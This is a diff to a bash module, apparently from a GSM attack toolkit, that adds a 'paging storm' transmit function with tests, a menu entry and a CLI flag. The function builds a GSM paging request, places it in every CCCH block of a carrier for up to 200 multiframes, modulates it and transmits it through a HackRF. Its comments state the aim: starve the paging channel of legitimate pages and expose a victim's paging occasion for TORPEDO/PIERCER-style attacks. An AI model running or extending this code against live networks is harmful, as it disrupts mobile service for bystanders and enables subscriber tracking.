@@ -2278,6 +2278,35 @@ EOS
     # No arm may print a bare success word: the status field carries it.
     chk tx-no-success-line "$(printf '%s' "$out" | grep -ciE '^(OK|SUCCESS|sent|transmitted)\b')" "0"
 
+    # 21. The paging storm: every CCCH block of the multiframe carries the same
+    # request, for N multiframes, and it refuses without a radio.
+    out=$(PGT_STORM_CYCLES=2 PGT_SDR_DEVICE= pgt_tx_storm 2>/dev/null); trc=$?
+    chk storm-rc         "$trc" "3"
+    chk storm-status     "$(fld "$out" status)" "not-transmitted"
+    chk storm-block      "$(fld "$out" l2_block)" "0303490806211031123456782b2b2b2b2b2b2b2b2b2b2b"
+    chk storm-mfs        "$(fld "$out" multiframes)" "2"
+    chk storm-frames     "$(fld "$out" tdma_frames)" "102"
+    # Two multiframes, three CCCH blocks each, four frames per block.
+    chk storm-hit-count  "$(printf '%s' "$(fld "$out" paging_frame_numbers)" | tr ',' '\n' | grep -c .)" "24"
+    chk storm-hit-first  "$(printf '%s' "$(fld "$out" paging_frame_numbers)" | cut -d, -f1-4)" "14,15,16,17"
+    # The BCCH blocks are frames 2..11 of each multiframe; a paging block must
+    # never land there, which is the placement bug this asserts.
+    chk storm-no-bcch-hit "$(printf '%s' "$(fld "$out" paging_frame_numbers)" \
+        | tr ',' '\n' | grep -cE '^(2|3|4|5|8|9|10|11|53|54|55|56|59|60|61|62)$')" "0"
+    chk storm-duration-ms "$(awk -v d="$(fld "$out" duration_microseconds)" \
+        'BEGIN{printf "%.1f", d/1000}')" "470.8"
+    chk storm-rate       "$(fld "$out" paging_blocks_per_second)" "12.745"
+    chk storm-wave       "$([[ -s "$(fld "$out" waveform)" ]] && echo yes || echo no)" "yes"
+    chk storm-wave-size  "$(stat -c %s "$(fld "$out" waveform)")" "$(fld "$out" waveform_bytes)"
+    chk storm-cycles-zero "$(PGT_STORM_CYCLES=0 pgt_tx_storm >/dev/null 2>&1; echo $?)" "2"
+    chk storm-cycles-huge "$(PGT_STORM_CYCLES=201 pgt_tx_storm >/dev/null 2>&1; echo $?)" "2"
+    # And the same driver contract: the storm's own file, at the same rate.
+    out=$(PATH="$d/bin:$PATH" PGT_REC="$d/srec" PGT_SDR_DEVICE=hackrf \
+          PGT_STORM_CYCLES=1 pgt_tx_storm 2>/dev/null); trc=$?
+    chk storm-hackrf-rc   "$trc" "0"
+    chk storm-hackrf-argv "$(tr '\n' ' ' < "$d/srec" | sed 's/ $//')" \
+        "-t $PGT_DIR/tx_storm.cs8 -f 935200000 -s 2166667 -a 1 -x 0"
+
     printf 'ASSERTIONS\t%d\n' "$nchk"
     rm -rf "$d"
     trap - EXIT
@@ -2476,6 +2505,56 @@ pgt_ccch_block() {   # <rr-message-hex, first octet = the L2 pseudo length>
     printf '0303%02x%s%s' "$(( (n << 3) | 1 ))" "$msg" "$fill"
 }
 
+# The radio half, shared by every transmit verb here so the probe, the
+# refusal and the driver contract are written once. <wave> <hz> <rate> <gain>
+# <what>
+pgt_tx_key() {
+    local wave="$1" hz="$2" rate="$3" gain="$4" what="${5:-the waveform}"
+    local dev; dev=$(pgt_find_tx_sdr) || {
+        printf 'status\tnot-transmitted\n'
+        printf 'tx_device\tnone\n'
+        printf 'requires_sdr\t%s\n' "a HackRF (built-in: hackrf_transfer), or a bladeRF/LimeSDR/USRP through PGT_TX_CMD; on the ARFCN you are authorised to use"
+        printf 'note\t%s\n' "$what: the waveform above is real and on disk, only the radio hop is missing"
+        printf 'ERROR\tno SDR device: %s/sdr_device did not name one and no probe (hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices) answered\n' "$TMP_DIR" >&2
+        printf 'WHY\tthe block is built and modulated before the radio is looked for, so this is a radio problem and not a protocol one; set PGT_SDR_DEVICE=<driver> to force a named device, or PGT_TX_CMD for a driver with no built-in call here\n' >&2
+        return 3; }
+
+    local cmd
+    if [[ -n "${PGT_TX_CMD:-}" ]]; then
+        cmd="$PGT_TX_CMD"
+    else
+        case "$dev" in
+            hackrf)
+                cmd=$(printf 'hackrf_transfer -t %q -f %s -s %s -a 1 -x %s' \
+                        "$wave" "$hz" "$rate" "$gain") ;;
+            *)
+                printf 'status\tnot-transmitted\n'
+                printf 'tx_device\t%s\n' "$dev"
+                printf 'ERROR\t%s has no built-in transmit call in this module\n' "$dev" >&2
+                printf 'WHY\tset PGT_TX_CMD to a command that reads PGT_TX_IQ (the waveform path) and sends it; PGT_TX_FREQ_HZ, PGT_TX_RATE and PGT_TX_GAIN_DB are exported beside it\n' >&2
+                return 3 ;;
+        esac
+    fi
+
+    # The driver inherits a subshell, so the exported PGT_TX_* names cannot
+    # leak into the caller's environment and change a later call.
+    local trc=0
+    ( export PGT_TX_IQ="$wave" PGT_TX_FREQ_HZ="$hz" PGT_TX_RATE="$rate" \
+             PGT_TX_GAIN_DB="$gain" PGT_TX_DEVICE="$dev"
+      timeout 120 bash -c "$cmd" </dev/null ) || trc=$?
+
+    printf 'status\t%s\n' "$([[ $trc -eq 0 ]] && echo transmitted || echo driver-failed)"
+    printf 'tx_device\t%s\n' "$dev"
+    printf 'tx_cmd\t%s\n' "$cmd"
+    printf 'tx_rc\t%d\n' "$trc"
+    if (( trc == 0 )); then
+        printf 'note\t%s\n' "keyed: $what"
+    else
+        printf 'ERROR\tthe driver exited %d; nothing can be assumed to have been radiated\n' "$trc" >&2
+    fi
+    return "$trc"
+}
+
 pgt_tx_paging() {
     # The protocol half is real: this builds the paging request from a spec,
     # wraps it in the LAPDm block the CCCH carries, modulates that block into
@@ -2542,49 +2621,96 @@ pgt_tx_paging() {
     printf 'burst_structure\t%s\n' "the block fills four normal bursts in one TDMA timeslot, each 114 coded bits after the xCCH coder interleaves 456 bits"
     printf 'timing\t%s\n' "the stream is one block, sent once; a paging channel repeats it every BS_PA_MFRMS*51 TDMA frames and the target listens only in its own paging occasion, so the schedule -- not the waveform -- is what reaches the UE (see --po)"
 
-    local dev; dev=$(pgt_find_tx_sdr) || {
-        printf 'status\tnot-transmitted\n'
-        printf 'tx_device\tnone\n'
-        printf 'requires_sdr\t%s\n' "a HackRF (built-in: hackrf_transfer), or a bladeRF/LimeSDR/USRP through PGT_TX_CMD; on the ARFCN you are authorised to use"
-        printf 'note\t%s\n' "the LAPDm block and its waveform above are real and on disk; only the radio hop is missing"
-        printf 'ERROR\tno SDR device: %s/sdr_device did not name one and no probe (hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices) answered\n' "$TMP_DIR" >&2
-        printf 'WHY\tthe block is built and modulated before the radio is looked for, so this is a radio problem and not a protocol one; set PGT_SDR_DEVICE=<driver> to force a named device, or PGT_TX_CMD for a driver with no built-in call here\n' >&2
-        return 3; }
+    pgt_tx_key "$wave" "$hz" "$smprate" "$gain" \
+        "one CCCH/PCH block on ARFCN $arfcn (a receiver must already be camped on a cell broadcasting this ARFCN and BSIC)"
+}
 
-    local cmd
-    if [[ -n "${PGT_TX_CMD:-}" ]]; then
-        cmd="$PGT_TX_CMD"
-    else
-        case "$dev" in
-            hackrf)
-                cmd=$(printf 'hackrf_transfer -t %q -f %s -s %s -a 1 -x %s' \
-                        "$wave" "$hz" "$smprate" "$gain") ;;
-            *)
-                printf 'status\tnot-transmitted\n'
-                printf 'tx_device\t%s\n' "$dev"
-                printf 'ERROR\t%s has no built-in transmit call in this module\n' "$dev" >&2
-                printf 'WHY\tset PGT_TX_CMD to a command that reads PGT_TX_IQ (the waveform path) and sends it; PGT_TX_FREQ_HZ, PGT_TX_RATE and PGT_TX_GAIN_DB are exported beside it\n' >&2
-                return 3 ;;
-        esac
-    fi
+# The paging storm: the same paging request in every CCCH block of a carrier,
+# for N multiframes. A carrier sends three CCCH blocks per 51-multiframe
+# (0.2354 s), so the block rate is ~12.7 a second and every paging occasion in
+# the cell is hit. That is the point of the attack: a UE that is not the
+# addressee still decodes the block, checks the identity and discards it, and
+# the paging channel has no room left for the pages that matter. It is also
+# what makes a victim's paging occasion observable from the outside, which is
+# the measurement --torpedo-model and --piercer-correlate consume offline.
+#
+# The BCCH is the caller's problem, deliberately: this places CCCH blocks in
+# multiframe positions 2..4 and leaves positions 0..1 to PGT_BCCH_BLOCKS. With
+# no real System Information there, nothing can camp and the storm is only
+# receivable on a carrier that is already on the air -- e.g. the one
+# modules/07_gsm_attack.sh --transmit builds, whose SI blocks you can pass in.
+pgt_tx_storm() {
+    local spec="${1:-}"
+    [[ -n "$spec" ]] || spec="${PGT_TX_SPEC:-tmsi=12345678,page_mode=normal,channel_needed=sdcch,type=1}"
+    local built; built=$(pgt_build_paging_req gsm "$spec") || {
+        printf 'ERROR\tcould not build a GSM paging request from spec: %s\n' "$spec" >&2
+        return 2; }
+    local mhex; mhex=$(printf '%s\n' "$built" | awk -F'\t' '$1=="message_hex"{print $2}')
+    [[ -n "$mhex" ]] || {
+        printf 'ERROR\tthe builder produced no message; nothing was radiated\n' >&2; return 2; }
+    local block; block=$(pgt_ccch_block "$mhex") || return $?
 
-    # The driver inherits a subshell, so the exported PGT_TX_* names cannot
-    # leak into the caller's environment and change a later call.
-    local trc=0
-    ( export PGT_TX_IQ="$wave" PGT_TX_FREQ_HZ="$hz" PGT_TX_RATE="$smprate" \
-             PGT_TX_GAIN_DB="$gain" PGT_TX_DEVICE="$dev"
-      timeout 120 bash -c "$cmd" </dev/null ) || trc=$?
+    local cycles="${PGT_STORM_CYCLES:-8}"
+    [[ "$cycles" =~ ^[0-9]+$ ]] && (( cycles >= 1 )) && (( cycles <= 200 )) || {
+        printf 'ERROR\tPGT_STORM_CYCLES must be 1..200 multiframes (got %s)\n' "$cycles" >&2
+        printf 'WHY\t200 multiframes is 47 s of stream and 200 MB at 2.17 Msps; longer needs a loop, not a bigger file\n' >&2
+        return 2; }
 
-    printf 'status\t%s\n' "$([[ $trc -eq 0 ]] && echo transmitted || echo driver-failed)"
-    printf 'tx_device\t%s\n' "$dev"
-    printf 'tx_cmd\t%s\n' "$cmd"
-    printf 'tx_rc\t%d\n' "$trc"
-    if (( trc == 0 )); then
-        printf 'note\t%s\n' "keyed: one CCCH/PCH block on ARFCN $arfcn; a receiver must already be camped on a cell broadcasting this ARFCN and BSIC to listen to its paging channel"
-    else
-        printf 'ERROR\tthe driver exited %d; nothing can be assumed to have been radiated\n' "$trc" >&2
-    fi
-    return "$trc"
+    local arfcn="${PGT_TX_ARFCN:-1}"
+    [[ "$arfcn" =~ ^[0-9]+$ ]] && (( arfcn <= 124 )) || {
+        printf 'ERROR\tPGT_TX_ARFCN must be 0..124 for the GSM 900 downlink (got %s)\n' "$arfcn" >&2
+        return 2; }
+    local hz; hz=$(pgt_tx_hz "$arfcn")
+    local rate="${PGT_TX_RATE:-2166666.666666667}"
+    local tn="${PGT_TX_TN:-0}" bsic="${PGT_TX_BSIC:-0}" gain="${PGT_TX_GAIN:-0}"
+    [[ "$tn" =~ ^[0-7]$ ]] || { printf 'ERROR\tPGT_TX_TN must be 0..7 (got %s)\n' "$tn" >&2; return 2; }
+    [[ "$gain" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\tPGT_TX_GAIN must be a non-negative integer in dB (got %s)\n' "$gain" >&2; return 2; }
+
+    local wave="$PGT_DIR/tx_storm.cs8"
+    mkdir -p "$PGT_DIR"
+    local -a cargs=(--rate "$rate" --tn "$tn" --bsic "$bsic"
+                    --multiframes "$cycles" --paging-block "$block")
+    local b
+    for b in ${PGT_BCCH_BLOCKS:-}; do cargs+=(--block "$b"); done
+
+    local gen
+    gen=$(python3 "$IMSISTING_ROOT/tools/gsm_mod.py" carrier "$wave" "${cargs[@]}" 2>&1) || {
+        printf 'ERROR\tthe carrier builder refused this layout: %s\n' \
+            "$(printf '%s' "$gen" | head -n1)" >&2
+        return 2; }
+    local smprate bytes sha bcchn mfs frames dur frames_hit
+    smprate=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="sample_rate"{print $2}')
+    bytes=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="bytes"{print $2}')
+    sha=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="sha256"{print $2}')
+    bcchn=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="bcch_blocks"{print $2}')
+    mfs=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="multiframes"{print $2}')
+    frames=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="tdma_frames"{print $2}')
+    dur=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="duration_microseconds"{print $2}')
+    frames_hit=$(printf '%s\n' "$gen" | awk -F'\t' '$1=="paging_frame_numbers"{print $2}')
+
+    printf 'built_spec\t%s\n' "$spec"
+    printf 'built_message\t%s\n' "$mhex"
+    printf 'built_octets\t%d\n' "$(( ${#mhex} / 2 ))"
+    printf 'l2_block\t%s\n' "$block"
+    printf 'l2_octets\t%d\n' "$(( ${#block} / 2 ))"
+    printf 'arfcn\t%s\ndl_hz\t%s\nsample_rate\t%s\n' "$arfcn" "$hz" "$smprate"
+    printf 'waveform\t%s\nwaveform_bytes\t%s\nwaveform_sha256\t%s\n' "$wave" "$bytes" "$sha"
+    printf 'timeslot\t%s\nbsic\t%s\ngain_db\t%s\n' "$tn" "$bsic" "$gain"
+    printf 'bcch_blocks\t%s\nmultiframes\t%s\ntdma_frames\t%s\n' "$bcchn" "$mfs" "$frames"
+    printf 'duration_microseconds\t%s\n' "$dur"
+    printf 'paging_frame_numbers\t%s\n' "$frames_hit"
+    # Three CCCH blocks per 51-multiframe, and a multiframe is 51*1250 symbol
+    # periods at 270.833 ksps -- 235.4 ms -- so this is the channel's own rate,
+    # not a number this module chose.
+    printf 'paging_blocks_per_second\t%s\n' \
+        "$(awk 'BEGIN { printf "%.3f", 3.0 / (51 * 1250 / 270833.3333333333) }')"
+    printf 'burst_structure\t%s\n' "every CCCH block in multiframe positions 2, 3 and 4 carries the same paging request; positions 0 and 1 stay BCCH"
+    printf 'note\t%s\n' "with no real System Information in the BCCH blocks this is not campable, so it is a storm on a cell already on the air on this ARFCN; supply its SI blocks with PGT_BCCH_BLOCKS"
+    printf 'timing\t%s\n' "one multiframe is 51 TDMA frames = 235.4 ms, so the block repeats three times per multiframe and the whole stream is $mfs multiframes"
+
+    pgt_tx_key "$wave" "$hz" "$smprate" "$gain" \
+        "$mfs multiframes of paging (3 CCCH blocks each) on ARFCN $arfcn"
 }
 
 # ── menu ────────────────────────────────────────────────────────────────
@@ -2609,6 +2735,7 @@ pgt_menu() {
   [13] GSM page mode and channel needed
   [14] build a paging message
   [15] build and radiate one paging block  (refuses with no radio)
+  [16] paging storm: every CCCH block, N multiframes
   [0]  back
 
 M
@@ -2678,6 +2805,7 @@ pgt_cli_main() {
         --page-mode)        pgt_cli_page_mode "${1:-}" ;;
         --build-paging-req) pgt_cli_build_paging_req "${1:-}" "${2:-}" ;;
         --paging-tx)        pgt_tx_paging "${1:-}" ;;
+        --paging-storm)     pgt_tx_storm "${1:-}" ;;
         --selftest)         pgt_selftest ;;
         --menu)             pgt_menu ;;
         *)
@@ -2706,6 +2834,8 @@ Usage: $0 COMMAND
   --paging-tx [spec]                    build a paging block and key the radio;
                                         PGT_TX_ARFCN/TN/BSIC/RATE/GAIN tune it,
                                         PGT_TX_CMD overrides the driver
+  --paging-storm [spec]                 the same paging request in every CCCH
+                                        block for PGT_STORM_CYCLES multiframes
   --plan <torpedo|piercer>              write a handoff plan
   --selftest                            verify arithmetic and parsers, no radio
   --menu                                interactive menu
